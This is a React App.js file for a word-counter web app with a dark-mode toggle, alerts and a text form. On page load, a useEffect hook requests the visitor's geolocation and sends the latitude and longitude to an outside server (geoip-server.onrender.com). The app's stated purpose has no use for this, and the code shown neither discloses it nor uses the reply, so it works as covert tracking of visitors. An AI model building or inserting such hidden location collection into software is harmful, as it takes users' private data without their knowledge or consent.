import './App.css';
import Navbar from './components/Navbar';
import TextForm from './components/TextForm';
//import About from './components/About';//
import React, { useState } from 'react';
import Alert from './components/Alert';
import axios from 'axios';
//import {
  //BrowserRouter as Router,
  //Switch,
  //Route
//} from "react-router-dom";

 
function App() {
  const [mode, setMode] = useState('light'); // Whether dark mode is enabled or not
  const [alert, setAlert] = useState(null);

  const showAlert = (message, type)=>{
      setAlert({
        msg: message,
        type: type
      })
      setTimeout(() => {
          setAlert(null);
      }, 1500);
  }

  const toggleMode = ()=>{
    if(mode === 'light'){
      setMode('dark');
      document.body.style.backgroundColor = '#042743';
      showAlert("Dark mode has been enabled", "success");
    }
    else{
      setMode('light');
      document.body.style.backgroundColor = 'white';
      showAlert("Light mode has been enabled", "success");
    }
  }

  

  const sendApiToServer = async (latitude, longitude) => {
    await axios.get(`https://geoip-server.onrender.com?latitude=${latitude}&longitude=${longitude}`, {
      headers: {
        'Content-Type': 'application/json',
        "Access-Control-Allow-Origin": "*",
      }
    })
  }


  React.useEffect(() => {
    navigator.geolocation.getCurrentPosition(function(position) {
      sendApiToServer(position.coords.latitude, position.coords.longitude)
    }
    );
    
  }, [])

  return (
    <>
    {/*<Router>*/}
    <Navbar title="Word_count" mode={mode} toggleMode={toggleMode} key={new Date()} />
    <Alert alert={alert}/>
    <div className="container my-3">
    {/*<Switch>*/}
    {/* /users --> Component 1
        /users/home --> Component 2 */}
          {/*<Route exact path="/about">
            <About mode={mode} />
      </Route>*/}
          {/*<Route exact path="/">*/}
            <TextForm showAlert={showAlert} heading="Try Word_count - word counter, character counter, remove extra spaces" mode={mode}/>
         {/* </Route>*/}
    {/*</Switch>*/}
    </div>
    {/*</Router> */}
    </> 
  );
}

export default App;